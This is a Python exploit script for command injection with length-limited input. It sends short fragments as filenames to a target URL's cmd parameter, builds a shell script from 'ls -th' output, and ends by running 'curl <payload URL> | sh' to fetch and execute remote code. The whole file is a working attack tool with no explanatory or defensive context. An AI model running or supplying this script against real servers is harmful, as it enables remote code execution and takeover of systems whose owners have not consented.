import argparse
import requests
from time import sleep

payload = [
    # Generate 'ls -th>x'
    '>dir',
    '>sl',
    '>g\>',
    '>ht-',
    '*>v',
    '>rev',
    '*v>_',
    '>\;',
    '>sh', 
    #'>th\\',               # TO USE PYTHON INSTEAD OF SH 
    #'>py\\',               # TO USE PYTHON INSTEAD OF SH
    '>\|\\' 
]

payload_tail = [
    # Run all and curl part
    '>\ \\',
    '>rl\\', 
    '>cu\\', 
    'sh _', 
    'sh g'
]

parser = argparse.ArgumentParser()
parser.add_argument("--url", "-u", help="Payload location ", required=True)
parser.add_argument("--target", "-t", help="Url target (with param ex: http://target?cmd", required=True)
arguments = parser.parse_args()

def main():
    craft_payload()
    send()

def craft_payload():
    url = list(arguments.url)
    aux = [url[index : index + 2] for index in range(0, len(url), 2)]
    splited = [''.join(ele) for ele in aux]
    splited.reverse()
    
    for i in range(len(splited)):
        splited[i] = '>' + splited[i] + '\\'

    
    splited.extend(payload_tail)
    payload.extend(splited)
    print(payload)

def send():
    for i in payload:
        r = requests.get(arguments.target + '=' + i)
        print (i)
        sleep(0.3)

if __name__ == "__main__":
    main()